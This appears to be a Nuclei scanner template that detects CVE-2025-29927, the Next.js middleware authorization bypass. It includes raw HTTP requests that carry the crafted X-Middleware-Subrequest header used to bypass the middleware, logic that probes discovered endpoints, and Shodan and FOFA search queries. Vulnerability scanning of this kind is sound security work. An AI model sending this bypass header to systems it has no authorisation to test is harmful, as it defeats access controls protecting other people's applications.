flow: "let base_check = function () {\n  return http(1) && http(2);\n};\n\nlet endpoint_check\
  \ = function () {\n  if (!http(3)) return false;\n\n  for (let endpoint_urls of\
  \ iterate(template.endpoints)) {\n    set(\"endpoints\", endpoint_urls);\n    if\
  \ (!(http(4) && http(5))) return false;\n  }\n\n  return true;\n};\nbase_check()\
  \ || endpoint_check()\n"
http:
- extractors:
  - name: redirect_path
    part: header
    regex:
    - '(?i)(x-nextjs-redirect|x-middleware-rewrite|x-nextjs-rewrite): (.*)'
    type: regex
  matchers:
  - internal: true
    part: header
    regex:
    - (?i)x-nextjs-redirect|x-middleware-rewrite|x-nextjs-rewrite
    type: regex
  - internal: true
    status:
    - 307
    type: status
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Nextjs-Data: 1

    '
- matchers:
  - status:
    - 200
    type: status
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Nextjs-Data: 1

    X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware

    '
- extractors:
  - group: 1
    internal: true
    name: endpoints
    part: body
    regex:
    - href=['"](\/[^\."']+)['"]
    type: regex
  method: GET
  path:
  - '{{BaseURL}}'
  redirects: true
- matchers:
  - dsl:
    - contains_any(to_lower(header), 'x-middleware-rewrite', 'x-middleware-next',
      'x-middleware-redirect') && status_code != 200
    - contains_any(to_lower(location), 'unauthorized') && status_code != 200
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}{{endpoints}}'
- headers:
    X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
  matchers:
  - dsl:
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}{{endpoints}}'
id: CVE-2025-29927
info:
  author: pdresearch,pdteam,hazedic
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-287
    epss-score: 0.93601
  description: 'Next.js contains a critical middleware bypass vulnerability affecting
    versions 11.1.4 through 15.2.2.

    The vulnerability allows attackers to bypass middleware security controls by sending
    a specially crafted

    ''x-middleware-subrequest'' header, which can lead to authorization bypass and
    other security control circumvention.

    '
  metadata:
    fofa-query: x-middleware-rewrite
    max-request: 1
    product: next.js
    shodan-query: x-middleware-rewrite
    vendor: zeit
  name: Next.js Middleware Bypass
  reference:
  - https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
  - https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/
  remediation: 'Upgrade to Next.js 14.2.25 or 15.2.3 or later.

    If upgrading is not possible, block the x-middleware-subrequest header at the
    WAF or server level.

    '
  severity: critical
  tags: cve,cve2025,nextjs,middleware,auth-bypass
